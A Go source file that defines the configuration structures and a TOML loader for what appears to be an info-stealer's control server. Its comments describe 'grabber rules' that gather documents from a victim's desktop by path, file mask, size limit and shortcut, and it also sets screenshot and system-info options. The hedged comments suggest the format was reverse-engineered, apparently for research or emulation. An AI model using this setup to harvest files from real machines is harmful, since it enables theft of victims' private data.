package configs

import (
	"github.com/pelletier/go-toml"
)

type ServerConfig struct {
	ConfigID   string
	DLLPathKey string
	DbPath     string
	HostAddr   string
	Libs       []string
	Grbrs      []GrabberRule
	Scrnsht    int
	Sstmnfo    SystemInfo
}

type GrabberRule struct {
	// 	grbr_dekstop:%USERPROFILE%\Desktop\|*.txt, *.doc, *pdf*|-|5|1|0|files
	Name       string // Name of GrabberRule; Prepends the rule in the form of "grbr_<Name>:"
	Path       string // Starting directory on the victim host from which to start the ‘file grabber’; for example: C:\.
	Mask       string // Comma-delimited list of filename masks including wildcards; for example: *.doc,*.xls.
	SizeLimit  int    // Maximum size per file (up-to 100mb), in kilobytes; for example 150kb would be: 150. Presuming 0 for 'no limit'.
	Exceptions string // Directories, within the specified path, to exclude from searches, for example: \Windows\.
	Subfolders int    // Presumably enabling or disabling searches within subdirectories. 0 or 1
	Shortcuts  int    // Collect matching files referenced by shortcuts; for example, file.doc.lnk would download the corresponding file.doc. 0 or 1
}

type SystemInfo struct {
	Name    string
	Modules []string
}

func LoadServerConfig() (*ServerConfig, error) {
	config := ServerConfig{}
	tree, err := toml.LoadFile("config.toml")
	if err != nil {
		return nil, err
	}

	if err := tree.Unmarshal(&config); err != nil {
		return nil, err
	}

	return &config, nil
}
